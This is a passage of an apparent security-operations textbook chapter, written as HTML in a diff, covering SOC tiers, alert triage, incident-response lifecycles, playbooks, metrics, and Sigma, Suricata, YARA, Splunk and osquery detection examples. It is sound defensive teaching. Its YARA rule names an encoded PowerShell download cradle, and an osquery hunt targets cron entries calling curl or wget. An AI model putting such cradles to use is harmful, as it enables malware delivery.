+<td>Wrong password</td>
+</tr>
+<tr>
+<td>0xC0000234</td>
+<td>Account is locked out</td>
+</tr>
+<tr>
+<td>0xC0000072</td>
+<td>Account is disabled</td>
+</tr>
+<tr>
+<td>0xC000006F</td>
+<td>Logon outside permitted hours</td>
+</tr>
+<tr>
+<td>0xC0000071</td>
+<td>Password has expired</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Key distinction:</strong> many 4625 events with SubStatus <code>0xC0000064</code> (user does not exist) interleaved → a sign of <strong>password spray / user enumeration</strong>; many <code>0xC000006A</code> for the <strong>same user</strong> → <strong>brute-force</strong> of that specific account.</p>
+<h3 id="ch10-1023-cef-common-event-format-a-popular-siem-format">10.2.3. CEF (Common Event Format) — a popular SIEM format</h3>
+<p>CEF was defined by ArcSight; its header is delimited by the <code>|</code> character:</p>
+<pre><code>CEF:Version|Device Vendor|Device Product|Device Version|Signature ID|Name|Severity|Extension
+</code></pre>
+<p>Example:</p>
+<pre><code>CEF:0|Security|Firewall|2.1|100|Blocked connection|7|src=203.0.113.45 dst=10.0.0.5 spt=51022 dpt=22 proto=TCP act=blocked
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Meaning</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Version</td>
+<td>CEF version</td>
+<td><code>0</code></td>
+</tr>
+<tr>
+<td>Device Vendor</td>
+<td>Vendor</td>
+<td><code>Security</code></td>
+</tr>
+<tr>
+<td>Device Product</td>
+<td>Product</td>
+<td><code>Firewall</code></td>
+</tr>
+<tr>
+<td>Device Version</td>
+<td>Product version</td>
+<td><code>2.1</code></td>
+</tr>
+<tr>
+<td>Signature ID</td>
+<td>Event type code</td>
+<td><code>100</code></td>
+</tr>
+<tr>
+<td>Name</td>
+<td>Description</td>
+<td><code>Blocked connection</code></td>
+</tr>
+<tr>
+<td>Severity</td>
+<td>0–10</td>
+<td><code>7</code></td>
+</tr>
+<tr>
+<td>Extension</td>
+<td>key=value pairs (CEF dictionary)</td>
+<td><code>src=... dst=... spt=...</code></td>
+</tr>
+</tbody>
+</table>
+<p>Standard Extension keys: <code>src</code> (source IP), <code>dst</code> (dest IP), <code>spt</code> (source port), <code>dpt</code> (dest port), <code>suser</code> (source user), <code>act</code> (action), <code>proto</code>. Standardized keys are the reason CEF is so widely supported by SIEMs — the parser knows in advance the meaning of each key.</p>
+<hr />
+<h2 id="ch10-103-soc-structure-by-tier-the-exact-responsibilities-of-each-level">10.3. SOC structure by tier — the exact responsibilities of each level</h2>
+<p>A SOC is organized in a <strong>tiered</strong> model to allocate work complexity and staffing cost sensibly. This is not a hierarchy of status but a division of work by investigation depth.</p>
+<pre><code>                       ┌──────────────────────────────────────────────┐
+                       │              Feedback loop                    │
+                       │   New detection rules, IOC/TTP, FP tuning     │
+                       ▼                                               │
+  SIEM ──alert──&gt; ┌─────────┐  escalate   ┌─────────┐  escalate  ┌─────────┐
+                  │ Tier 1  │ ───(case)──&gt; │ Tier 2  │ ──(major)─&gt;│ Tier 3  │
+                  │ Triage  │             │ Investig.│           │ Hunt/RE  │
+                  └────┬────┘             └────┬────┘            └────┬────┘
+                       │ mostly FP/simple       │ investigation,      │ proactive hunting,
+                       │ -&gt; close in place      │ containment          │ deep forensics, APT
+                       ▼                        ▼                      ▼
+                  TP/FP ticket            Report + IOC          Detection + RCA
+</code></pre>
+<p>Note: alerts move up (escalate) when they exceed the capability/complexity of the current tier; knowledge (detection rules, IOCs, tuning) flows back down to automate what was investigated manually, reducing the load on lower tiers.</p>
+<h3 id="ch10-1031-tier-1-triage-analyst-alert-handler">10.3.1. Tier 1 — Triage Analyst (Alert Handler)</h3>
+<p><strong>Responsibilities:</strong>
+- The front line that receives alerts from the SIEM.
+- Performs initial <strong>triage</strong>: quickly verifying whether an alert is a true positive (TP) or a false positive (FP).
+- Classifies by type (malware, phishing, brute-force, etc.) and by priority level.
+- Closes well-justified FPs; <strong>escalates</strong> to Tier 2 if it exceeds their capability/complexity.
+- KPIs: alert response time, percentage of alerts handled within SLA.</p>
+<p><strong>Limits:</strong> Tier 1 works according to predefined <strong>playbooks/runbooks</strong>; they do not perform deep, free-form system investigation. The goal is throughput and consistency.</p>
+<h3 id="ch10-1032-tier-2-incident-responder-investigator">10.3.2. Tier 2 — Incident Responder / Investigator</h3>
+<p><strong>Responsibilities:</strong>
+- Receives escalated cases from Tier 1.
+- Investigates in depth: analyzes multi-source logs, builds timelines, determines scope and root cause.
+- Performs initial containment, coordinates eradication/recovery.
+- Performs intermediate-level forensics (memory, basic disk artifacts).
+- Writes and tunes detection rules to reduce FPs for Tier 1.</p>
+<h3 id="ch10-1033-tier-3-threat-hunter-forensics-malware-expert">10.3.3. Tier 3 — Threat Hunter / Forensics &amp; Malware Expert</h3>
+<p><strong>Responsibilities:</strong>
+- Proactive <strong>threat hunting</strong>: forming hypotheses and searching for traces of attackers that alerts have NOT detected.
+- In-depth forensics (memory forensics, malware reverse engineering).
+- Handling major incidents and APTs.
+- Developing new detections, threat intelligence, participating in purple team exercises.</p>
+<h3 id="ch10-1034-tier-comparison">10.3.4. Tier comparison</h3>
+<table>
+<thead>
+<tr>
+<th>Criterion</th>
+<th>Tier 1</th>
+<th>Tier 2</th>
+<th>Tier 3</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Input</td>
+<td>Raw alert</td>
+<td>Escalated case</td>
+<td>Hypothesis / major incident</td>
+</tr>
+<tr>
+<td>Main activity</td>
+<td>Triage, classification</td>
+<td>Investigation, containment</td>
+<td>Hunting, deep forensics, malware RE</td>
+</tr>
+<tr>
+<td>Degree of autonomy</td>
+<td>Follows playbook</td>
+<td>Guided investigation</td>
+<td>Self-directed</td>
+</tr>
+<tr>
+<td>Typical tools</td>
+<td>SIEM console, SOAR</td>
+<td>SIEM query, EDR, sandbox</td>
+<td>Volatility, IDA/Ghidra, YARA, threat intel</td>
+</tr>
+<tr>
+<td>Output</td>
+<td>TP/FP ticket, escalation</td>
+<td>Investigation report, IOC</td>
+<td>New detections, IOC/TTP, RCA</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Why tiering:</strong> alerts arrive in high volume but most are simple or false positives. Having expensive specialists (Tier 3) handle FPs is wasteful and causes burnout. Tiering ensures simple work is handled quickly and cheaply, while hard work is routed to people with the right capability.</p>
+<hr />
+<h2 id="ch10-104-alert-triage-process-step-by-step">10.4. Alert triage process — step by step</h2>
+<p>Triage is a core SOC operations skill. The standard process consists of 5 steps.</p>
+<h3 id="ch10-step-1-validation">Step 1 — Validation</h3>
+<p>Answer: is this alert real? Read the raw event behind the alert (do not trust the SIEM's summary), and check:
+- Is the log source trustworthy? (a real asset, or a honeypot/test?)
+- Does it match the baseline? (a known internal IP? a legitimate user?)
+- Is it a scheduled/approved activity? (a periodic scan, a pentest?)</p>
+<h3 id="ch10-step-2-categorization">Step 2 — Categorization</h3>
+<p>Assign an incident category according to the organization's taxonomy (usually mapped to NIST/VERIS or a MITRE ATT&amp;CK tactic): for example <code>Credential Access</code>, <code>Malware</code>, <code>Phishing</code>, <code>Recon</code>.</p>
+<h3 id="ch10-step-3-prioritization">Step 3 — Prioritization</h3>
+<p>Compute the priority level as a function of <strong>severity</strong> × <strong>confidence/fidelity</strong> × <strong>asset criticality</strong>. A commonly used priority formula:</p>
+<pre><code>Priority = Severity (Impact) × Likelihood
+</code></pre>
+<p>An example mapping into a P1–P4 matrix:</p>
+<table>
+<thead>
+<tr>
+<th>Impact \ Likelihood</th>
+<th>High</th>
+<th>Medium</th>
+<th>Low</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>High (production server/DC)</td>
+<td>P1</td>
+<td>P1</td>
+<td>P2</td>
+</tr>
+<tr>
+<td>Medium</td>
+<td>P2</td>
+<td>P2</td>
+<td>P3</td>
+</tr>
+<tr>
+<td>Low (test machine)</td>
+<td>P3</td>
+<td>P3</td>
+<td>P4</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch10-step-4-escalate-or-handle">Step 4 — Escalate or handle</h3>
+<ul>
+<li>If within the scope of a playbook → handle per the playbook.</li>
+<li>If beyond scope / suspected major incident → escalate to Tier 2 with <strong>full context</strong> (raw logs, IOCs, steps already taken). Escalation without context is the number-one cause of slow investigations.</li>
+</ul>
+<h3 id="ch10-step-5-closure">Step 5 — Closure</h3>
+<ul>
+<li>FP: clearly document the <strong>reason</strong> and the <strong>evidence</strong>; propose rule tuning so the alert does not recur.</li>
+<li>TP that has been handled: document the actions taken, IOCs, and lessons learned.</li>
+</ul>
+<p><strong>Security note:</strong> sloppy FP closure (not reading the raw log, "looks familiar") is a serious operational vulnerability — attackers deliberately create activity that "looks normal." Every closure must have traceable evidence.</p>
+<hr />
+<h2 id="ch10-105-incident-response-lifecycle-nist-sp-800-61-and-sans-picerl">10.5. Incident response lifecycle — NIST SP 800-61 and SANS PICERL</h2>
+<h3 id="ch10-1051-nist-sp-800-61-4-phases">10.5.1. NIST SP 800-61 — 4 phases</h3>
+<p>The classic 4-phase lifecycle comes from NIST SP 800-61 Rev. 2 (Computer Security Incident Handling Guide). Note that the lifecycle is a <strong>repeating cycle</strong> (not linear) — Detection &amp; Analysis and Containment/Eradication/Recovery may loop multiple times.</p>
+<blockquote>
+<p><strong>Version update:</strong> in April 2025 NIST released <strong>SP 800-61 Rev. 3</strong>, which supersedes Rev. 2. Rev. 3 no longer describes a linear 4-phase lifecycle; instead it is reorganized around the six <strong>NIST CSF 2.0</strong> functions (Govern, Identify, Protect, Detect, Respond, Recover) as a Community Profile. The 4-phase model shown here (Rev. 2) is still widely used for teaching and maps cleanly onto SANS PICERL, but reference the current standard as Rev. 3.</p>
+</blockquote>
+<pre><code>      ┌───────────────────────────────────────────────────────────────────────────┐
+      │                                                                           │
+      ▼                                                                           │
+┌───────────────┐   ┌───────────────┐   ┌───────────────────────────┐   ┌───────────────────┐
+│ 1.Preparation │──&gt;│ 2.Detection &amp; │──&gt;│ 3.Containment, Eradication│──&gt;│ 4.Post-Incident   │
+│               │   │   Analysis    │   │   &amp; Recovery              │   │   Activity        │
+│               │   │               │   │                           │   │ (Lessons Learned) │
+└───────────────┘   └───────┬───────┘   └─────────────┬─────────────┘   └─────────┬─────────┘
+      ▲                  ▲  │                      ▲  │                           │
+      │                  └──┘ (analysis loop)      └──┘ (handling loop)           │
+      └───────────────────────────────────────────────────────────────────────────┘
+</code></pre>
+<h4 id="ch10-phase-1-preparation">Phase 1 — Preparation</h4>
+<p><strong>Input:</strong> policies, budget, tools. <strong>Output:</strong> a ready response capability.
+Activities: build the IR plan &amp; playbooks; assemble a jump kit (forensic laptop, write-blocker, clean drives, cables); establish out-of-band communication channels (in case the main systems are compromised); training; tabletop exercises; ensure adequate logging/visibility. <strong>This is the most important phase</strong> — without preparation, the later phases descend into chaos.</p>
+<h4 id="ch10-phase-2-detection-analysis">Phase 2 — Detection &amp; Analysis</h4>
+<p><strong>Input:</strong> alerts, logs, reports. <strong>Output:</strong> confirmation of the incident, its scope, and its severity.
+Activities: identify precursors (signs that something is about to happen) and indicators (signs that something is happening/has happened); analyze and correlate; determine scope; <strong>document</strong> every finding; <strong>prioritize</strong> (functional/information/recoverability impact); <strong>notify</strong> relevant parties.</p>
+<h4 id="ch10-phase-3-containment-eradication-recovery">Phase 3 — Containment, Eradication &amp; Recovery</h4>
+<ul>
+<li><strong>Containment:</strong> prevent the spread. Divided into 2 levels:</li>
+<li><em>Short-term:</em> fast, possibly temporary actions — disconnect the infected machine from the network, block the C2 IP at the firewall. Goal: stop the damage NOW without destroying evidence.</li>
+<li><em>Long-term:</em> more stable solutions while preparing for eradication — temporary patches, placing the host in an isolation VLAN, applying ACLs.</li>
+<li><strong>Eradication:</strong> remove the root cause entirely — remove malware, delete attacker-created accounts, close the exploited vulnerability, reset compromised credentials.</li>
+<li><strong>Recovery:</strong> return systems to production safely — restore from clean backups, rebuild machines, apply enhanced monitoring to ensure the attacker does not return.</li>
+</ul>
+<h4 id="ch10-phase-4-post-incident-activity-lessons-learned">Phase 4 — Post-Incident Activity (Lessons Learned)</h4>
+<p><strong>Input:</strong> the full incident record. <strong>Output:</strong> improvements.
+Activities: hold a "lessons learned" meeting within a few days of closing the incident; answer: What happened and when? Where did the team do well/poorly? What information should we have had earlier? Which steps should we have done differently? What additional tools/processes are needed? Update playbooks, detections, and training.</p>
+<h3 id="ch10-1052-sans-picerl-6-steps">10.5.2. SANS PICERL — 6 steps</h3>
+<p>SANS uses a 6-step model, easily remembered by the acronym <strong>PICERL</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Name</th>
+<th>Corresponds to NIST</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>P</td>
+<td>Preparation</td>
+<td>Preparation</td>
+</tr>
+<tr>
+<td>I</td>
+<td>Identification</td>
+<td>Detection &amp; Analysis</td>
+</tr>
+<tr>
+<td>C</td>
+<td>Containment</td>
+<td>Containment</td>
+</tr>
+<tr>
+<td>E</td>
+<td>Eradication</td>
+<td>Eradication</td>
+</tr>
+<tr>
+<td>R</td>
+<td>Recovery</td>
+<td>Recovery</td>
+</tr>
+<tr>
+<td>L</td>
+<td>Lessons Learned</td>
+<td>Post-Incident Activity</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Difference from NIST:</strong> SANS separates Containment/Eradication/Recovery into 3 distinct steps (clearer operationally), whereas NIST combines them into a single phase (emphasizing the iterative nature). Essentially the two models are equivalent.</p>
+<h3 id="ch10-1053-containment-vs-eradication-the-core-distinction">10.5.3. Containment vs. Eradication — the core distinction</h3>
+<table>
+<thead>
+<tr>
+<th>Criterion</th>
+<th>Containment</th>
+<th>Eradication</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Goal</td>
+<td>Prevent spread, stop damage immediately</td>
+<td>Remove the root cause entirely</td>
+</tr>
+<tr>
+<td>Nature</td>
+<td>Temporary, reversible</td>
+<td>Permanent</td>
+</tr>
+<tr>
+<td>Example</td>
+<td>Disconnect the infected host from the network</td>
+<td>Format &amp; rebuild the host, remove the backdoor</td>
+</tr>
+<tr>
+<td>Evidence</td>
+<td>Must be PRESERVED (not yet deleted)</td>
+<td>After forensics has been collected</td>
+</tr>
+<tr>
+<td>Common mistake</td>
+<td>Powering off immediately → losing RAM (volatile)</td>
+<td>Removing malware but missing persistence</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Golden rule:</strong> Containment first, collect evidence (forensics), then Eradication. Eradication that misses a backdoor/scheduled task → the attacker returns during Recovery.</p>
+<hr />
+<h2 id="ch10-106-sample-playbooks-runbooks">10.6. Sample playbooks / runbooks</h2>
+<p><strong>Playbook</strong> = the high-level process (the phases, who does what, what to decide). <strong>Runbook</strong> = the specific operational steps (commands, queries) to carry out part of a playbook. Below are 3 key playbooks.</p>
+<h3 id="ch10-1061-playbook-brute-force-password-spray-sshrdp">10.6.1. Playbook — Brute-force / Password Spray (SSH/RDP)</h3>
+<pre><code>TRIGGER: &gt; 20 occurrences of 4625 (or sshd Failed password) from the same src within 5 minutes,
+         OR 1 src trying &gt; 10 different usernames (spray)
+
+1. IDENTIFY
+   - Query all failed logins from the src IP, 24h window.
+   - Determine: is there any 4624 (success) AFTER the failure sequence? -&gt; if YES: raise severity (already got in)
+   - Collect: src IP, target username, LogonType, geo/ASN of the IP.
+
+2. CONTAIN (short-term)
+   - If no success yet: block the src IP at the firewall/WAF.
+   - If an internal IP: isolate the source host (it may be compromised and used as a pivot).
+
+3. CONTAIN (if already successful - Step 1 detected a 4624)
+   - Disable the account that was successfully accessed.
+   - Force a password reset; kill active sessions.
+   - Switch to the &quot;Compromised Account&quot; playbook.
+
+4. ERADICATE
+   - Sweep for persistence on the host if the IP is internal.
+   - Check for newly created unknown accounts (Event 4720), group changes (4728/4732).
+
+5. RECOVER
+   - Remove the block after confirming safety / or keep blocking the IOC.
+   - Enable MFA, apply rate-limit / fail2ban.
+
+6. LESSONS
+   - Why did the account use a weak password? Is MFA in place? Tune the alert threshold.
+</code></pre>
+<h3 id="ch10-1062-playbook-phishing">10.6.2. Playbook — Phishing</h3>
+<pre><code>TRIGGER: User reports a suspicious email / EDR alerts on an attachment.
+
+1. IDENTIFY
+   - Collect the original email (.eml/.msg) - DO NOT forward (it strips headers). Use &quot;save as&quot;.
+   - Analyze headers: Return-Path, Received chain, SPF/DKIM/DMARC results (Authentication-Results).
+   - Extract IOCs: sender, reply-to, URL, attachment hash, domain.
+   - Detonate the attachment/URL in a sandbox.
+   - Query: how many other users RECEIVED this email? How many CLICKED/opened it?
+
+2. CONTAIN
+   - Quarantine/purge the email from every mailbox (e.g. Microsoft 365 Search &amp; Purge).
+   - Block the sender domain and URL at the mail gateway/proxy/DNS sinkhole.
+   - Reset credentials if it is credential-harvesting and the user entered them.
+
+3. ERADICATE
+   - Remove the payload on endpoints where it executed (EDR).
+   - Check for malicious mailbox rules (forwarding rules created by the attacker).
+
+4. RECOVER / LESSONS
+   - Notify users; awareness training; add IOCs to the blocklist.
+</code></pre>
+<h3 id="ch10-1063-playbook-ransomware">10.6.3. Playbook — Ransomware</h3>
+<pre><code>TRIGGER: Alert on mass file rename/encrypt, ransom note, EDR detection.
+
+1. CONTAIN (HIGHEST PRIORITY - speed is decisive)
+   - ISOLATE the infected host from the network NOW (unplug the cable/disable the switchport/EDR network-isolate).
+   - DO NOT power off (preserve RAM for forensics; some variants keep the key in RAM).
+   - Isolate backups from the network (ransomware targets backups).
+
+2. IDENTIFY
+   - Identify the variant (ransom note, extension, ID.Ransomware/no-more-ransom).
+   - Patient zero &amp; the intrusion vector (RDP brute? phishing? vulnerability?).
+   - Scope: which machines are infected, which network shares are encrypted.
+
+3. ERADICATE
+   - Rebuild infected machines from a clean image (DO NOT attempt to &quot;clean in place&quot;).
+   - Close the initial vector, reset all credentials (assume the domain is compromised).
+
+4. RECOVER
+   - Restore from backups VERIFIED to be clean (check that the backup is not infected).
+   - DO NOT rush to pay the ransom (no guarantee, may violate law/sanctions).
+
+5. LESSONS / beyond the technical
+   - Notify legal/authorities as required by regulation; communications; insurance.
+</code></pre>
+<p><strong>Note:</strong> with ransomware, the priority order is reversed from usual — <strong>Containment comes before Identification</strong> because the encryption spreads in a matter of minutes.</p>
+<hr />
+<h2 id="ch10-107-measurement-metrics-mttd-mttr">10.7. Measurement metrics — MTTD, MTTR</h2>
+<h3 id="ch10-1071-formulas">10.7.1. Formulas</h3>
+<p><strong>MTTD (Mean Time To Detect):</strong> the average time from when an incident begins to when it is detected.</p>
+<pre><code>MTTD = Σ (T_detect[i] − T_start[i]) / N
+</code></pre>
+<p><strong>MTTR (Mean Time To Respond/Recover/Remediate — must be defined clearly):</strong> the average time from detection to when handling/recovery is complete.</p>
+<pre><code>MTTR = Σ (T_resolve[i] − T_detect[i]) / N
+</code></pre>
+<p>Commonly encountered variants (state clearly which one you are measuring):
+- <strong>MTTA</strong> (Acknowledge): from alert to when an analyst takes it up.
+- <strong>MTTR</strong> may mean Respond, Recover, or Remediate — the definitions differ and must be agreed upon internally.</p>
+<p>Example calculation: 3 incidents with (detect − start) = 4h, 12h, 2h → MTTD = (4+12+2)/3 = 6h.</p>
+<h3 id="ch10-1072-how-to-improve">10.7.2. How to improve</h3>
+<table>
+<thead>
+<tr>
+<th>Metric</th>
+<th>How to improve</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MTTD</td>
+<td>Increase visibility (cover log gaps), add high-quality detection rules, proactive threat hunting, reduce FPs so analysts can focus</td>
+</tr>
+<tr>
+<td>MTTA</td>
+<td>Route alerts correctly, reduce alert fatigue (group/dedupe), 24/7 coverage</td>
+</tr>
+<tr>
+<td>MTTR</td>
+<td>Automation (SOAR playbooks), clear runbooks, ready-to-use action authority (pre-approved containment), drills</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Security note:</strong> blindly optimizing MTTD/MTTR easily leads to "closing cases quickly" → missing things. Metrics must be paired with the TP/FP ratio and a review of closure quality.</p>
+<hr />
+<h2 id="ch10-108-practical-tools-runnable-examples">10.8. Practical tools — runnable examples</h2>
+<h3 id="ch10-1081-sigma-writing-siem-independent-detection-rules">10.8.1. Sigma — writing SIEM-independent detection rules</h3>
+<p><strong>What it is:</strong> Sigma is a YAML format that describes a detection rule generically, after which <code>sigma</code>/<code>sigmac</code> (pySigma) converts it into the query language of a specific SIEM (Splunk SPL, Elastic KQL/EQL, QRadar AQL, etc.).</p>
+<p><strong>[DEMO]</strong> Rule example illustrating the mechanism — detecting SSH/Windows brute-force (illustrative only; tune before production use):</p>
+<pre><code class="language-yaml">title: Multiple Failed Logons Followed by Success (Possible Brute-Force)
+id: 7a8b9c10-1111-2222-3333-444455556666
+status: experimental
+description: Detects &gt;=20 failed logons from a single source then a success
+logsource:
+  product: windows
+  service: security
+detection:
+  failed:
+    EventID: 4625
+  success:
+    EventID: 4624
+  timeframe: 5m
+  condition: failed | count() by IpAddress &gt;= 20 and success
+fields:
+  - IpAddress
+  - TargetUserName
+  - LogonType
+falsepositives:
+  - Misconfigured service account
+  - Vulnerability scanner
+level: high
+tags:
+  - attack.credential_access
+  - attack.t1110            # Brute Force
+</code></pre>
+<p>Parameter explanation: <code>logsource</code> identifies the source so pySigma can choose the correct field mapping; <code>detection</code> contains the "search identifiers" (<code>failed</code>, <code>success</code>); <code>condition</code> matches the title exactly — grouping by <code>IpAddress</code>, it requires <strong>many failed logons (≥ 20) FOLLOWED BY at least one success from the same source</strong> (<code>failed | count() by IpAddress &gt;= 20 and success</code>), not merely a count of failures; <code>timeframe</code> is the correlation window; <code>tags</code> map to MITRE ATT&amp;CK (T1110 = Brute Force, see <a href="ch15.html">Chapter 15</a>).</p>
+<p><strong>Convert to Splunk:</strong></p>
+<pre><code class="language-bash">sigma convert -t splunk -p splunk_windows brute_force.yml
+</code></pre>
+<p><strong>[DEMO]</strong> Sample output (abbreviated, reflecting the "fail then success" condition):</p>
+<pre><code>(EventCode=4625 OR EventCode=4624)
+| stats count(eval(EventCode=4625)) as failed, count(eval(EventCode=4624)) as success by IpAddress
+| where failed &gt;= 20 AND success &gt; 0
+</code></pre>
+<p><strong>Security note:</strong> always declare <code>falsepositives</code> so Tier 1 understands the context; mapping MITRE <code>tags</code> helps measure coverage (which cells of the ATT&amp;CK matrix already have a rule).</p>
+<h3 id="ch10-1082-suricata-idsips-dissecting-a-rule">10.8.2. Suricata — IDS/IPS, dissecting a rule</h3>
+<p><strong>What it is:</strong> Suricata is an IDS/IPS engine that analyzes packets by signature.</p>
+<p><strong>Rule structure:</strong></p>
+<pre><code>action proto src_ip src_port direction dst_ip dst_port (options)
+</code></pre>
+<p><strong>[DEMO]</strong> Example illustration — detecting SSH brute-force using a threshold (the threshold must be tuned to the baseline before production use):</p>
+<pre><code>alert tcp $EXTERNAL_NET any -&gt; $HOME_NET 22 (msg:&quot;SSH brute force attempt&quot;; \
+  flow:to_server,established; \
+  threshold:type threshold, track by_src, count 5, seconds 60; \
+  classtype:attempted-admin; sid:1000001; rev:1;)
+</code></pre>
+<p>Dissecting each part:</p>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Meaning</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>action</td>
+<td>Action when matched</td>
+<td><code>alert</code> (alert only), <code>drop</code> (IPS)</td>
+</tr>
+<tr>
+<td>proto</td>
+<td>Protocol</td>
+<td><code>tcp</code></td>
+</tr>
+<tr>
+<td>src_ip / src_port</td>
+<td>Source</td>
+<td><code>$EXTERNAL_NET any</code></td>
+</tr>
+<tr>
+<td>direction</td>
+<td>Direction</td>
+<td><code>-&gt;</code> (one-way)</td>
+</tr>
+<tr>
+<td>dst_ip / dst_port</td>
+<td>Destination</td>
+<td><code>$HOME_NET 22</code></td>
+</tr>
+<tr>
+<td>msg</td>
+<td>Description in the alert</td>
+<td><code>"SSH brute force attempt"</code></td>
+</tr>
+<tr>
+<td>flow</td>
+<td>Connection state</td>
+<td><code>to_server,established</code></td>
+</tr>
+<tr>
+<td>threshold</td>
+<td>Frequency threshold</td>
+<td>5 times / 60s / per src</td>
+</tr>
+<tr>
+<td>classtype</td>
+<td>Classification</td>
+<td><code>attempted-admin</code></td>
+</tr>
+<tr>
+<td>sid</td>
+<td>Signature ID (≥1000000 for user-defined rules)</td>
+<td><code>1000001</code></td>
+</tr>
+<tr>
+<td>rev</td>
+<td>Rule revision</td>
+<td><code>1</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Test offline against a pcap file:</strong></p>
+<pre><code class="language-bash">suricata -r capture.pcap -S local.rules -l ./output/
+cat ./output/fast.log
+</code></pre>
+<p>Sample <code>fast.log</code> output:</p>
+<pre><code>06/19/2026-08:21:09.003456 [**] [1:1000001:1] SSH brute force attempt [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 203.0.113.45:51022 -&gt; 10.0.0.5:22
+</code></pre>
+<p><strong>Security note:</strong> <code>alert</code> only detects; to block you need IPS mode (<code>drop</code>) and Suricata must be inline (NFQUEUE/AF_PACKET). A <code>threshold</code> that is too sensitive causes FPs, too high misses attacks — it must be tuned to the baseline.</p>
+<h3 id="ch10-1083-yara-classifying-filesmalware-by-pattern">10.8.3. YARA — classifying files/malware by pattern</h3>
+<p><strong>What it is:</strong> YARA describes patterns (strings, bytes, regex) to identify malware families.</p>
+<pre><code class="language-yara">rule Suspicious_PowerShell_Downloader
+{
+    meta:
+        author = &quot;soc-team&quot;
+        description = &quot;Encoded PowerShell download cradle&quot;
+        date = &quot;2026-06-19&quot;
+    strings:
+        $a = &quot;powershell&quot; nocase
+        $b = &quot;-EncodedCommand&quot; nocase
+        $c = &quot;DownloadString&quot; nocase
+        $hex = { 49 45 58 20 28 4E 65 77 }   // &quot;IEX (New&quot;
+    condition:
+        $a and ($b or $c or $hex)
+}
+</code></pre>
+<p>Explanation: <code>strings</code> defines the patterns (<code>nocase</code> is case-insensitive; <code>$hex</code> is an exact byte sequence — <code>49 45 58</code> = ASCII "IEX"); <code>condition</code> is the combining logic.</p>
+<p><strong>Real-world scan:</strong></p>
+<pre><code class="language-bash">yara -r downloader.yar /home/user/Downloads/
+# Output: Suspicious_PowerShell_Downloader /home/user/Downloads/invoice.ps1
+</code></pre>
+<p><strong>Security note:</strong> patterns that are too generic (just <code>$a</code> "powershell") cause mass FPs; combine multiple conditions and a distinctive byte-pattern.</p>
+<h3 id="ch10-1084-splunk-spl-investigation-queries">10.8.4. Splunk SPL — investigation queries</h3>
+<p><strong>[DEMO]</strong> Example detecting brute-force-then-success (the scenario in section 10.10):</p>
+<pre><code class="language-spl">index=wineventlog (EventCode=4625 OR EventCode=4624)
+| transaction IpAddress maxspan=10m
+| where eventcount &gt; 20 AND searchmatch(&quot;EventCode=4624&quot;)
+| table _time IpAddress TargetUserName eventcount
+</code></pre>
+<p>Parameter explanation: <code>transaction</code> groups events with the same <code>IpAddress</code> within <code>maxspan=10m</code>; <code>eventcount</code> is the number of events in the transaction; the filter condition selects transactions that contain both many failures and at least one success.</p>
+<blockquote>
+<p><strong>Performance note:</strong> the SPL <code>transaction</code> command is resource-intensive on large datasets (it holds the state of each event group in memory); <strong>[PROD]</strong> production should use <code>stats</code> grouped by field instead of <code>transaction</code>:</p>
+<p><code>spl
+index=wineventlog (EventCode=4625 OR EventCode=4624)
+| stats count(eval(EventCode=4625)) as failed, count(eval(EventCode=4624)) as success,
+        min(_time) as first_seen, max(_time) as last_seen,
+        values(TargetUserName) as users by IpAddress
+| where failed &gt; 20 AND success &gt; 0</code></p>
+</blockquote>
+<h3 id="ch10-1085-velociraptor-osquery-querying-endpoints-for-hunting">10.8.5. Velociraptor / osquery — querying endpoints for hunting</h3>
+<p><strong>osquery</strong> lets you query endpoint state with SQL. Example finding a process listening on an unusual port:</p>
+<pre><code class="language-sql">SELECT p.name, p.pid, l.port, l.address
+FROM listening_ports l
+JOIN processes p ON l.pid = p.pid
+WHERE l.port NOT IN (22, 80, 443, 3389);
+</code></pre>
+<p>Finding scheduled-task/cron persistence (Linux):</p>
+<pre><code class="language-sql">SELECT * FROM crontab WHERE command LIKE '%curl%' OR command LIKE '%wget%';
+</code></pre>
+<h3 id="ch10-1086-thehive-soar-case-management-automation">10.8.6. TheHive / SOAR — case management &amp; automation</h3>
+<p><strong>What it is:</strong> TheHive is an IR case management platform; Cortex runs "analyzers" (e.g. a VirusTotal hash lookup). SOAR (Security Orchestration, Automation and Response) runs automated playbooks.</p>
+<p>Example SOAR playbook logic (pseudocode) for phishing:</p>
+<pre><code>on alert &quot;phishing&quot;:
+  observables = extract(email)         # sender, url, hash
+  for each url in observables.urls:
+     vt = VirusTotal.lookup(url)
+     if vt.malicious &gt;= 3:
+         MailGateway.block(url)
+         create_case(severity=&quot;high&quot;)
+         M365.purge(subject=email.subject)
+  notify_slack(&quot;#soc&quot;, summary)
+</code></pre>
+<p><strong>Security note:</strong> automating destructive actions (block/purge/isolate) must have safeguards: only auto-execute with high confidence; high-risk actions need a human-in-the-loop to prevent an attacker abusing the SOAR for DoS (e.g. deliberately triggering it to auto-block a range of legitimate IPs).</p>
+<hr />
+<h2 id="ch10-109-threat-hunting-hypotheses-based-on-mitre-attck">10.9. Threat Hunting — hypotheses based on MITRE ATT&amp;CK</h2>
+<h3 id="ch10-1091-principle">10.9.1. Principle</h3>
+<p>Hunting is <strong>proactively</strong> searching for traces of an attacker that automated detection has NOT yet caught. Unlike triage (reacting to an alert), hunting begins from a <strong>hypothesis</strong>, usually based on a technique in <strong>MITRE ATT&amp;CK</strong> (the Tactics × Techniques matrix, where each technique has a Txxxx code).</p>
+<p>The hunt loop:</p>
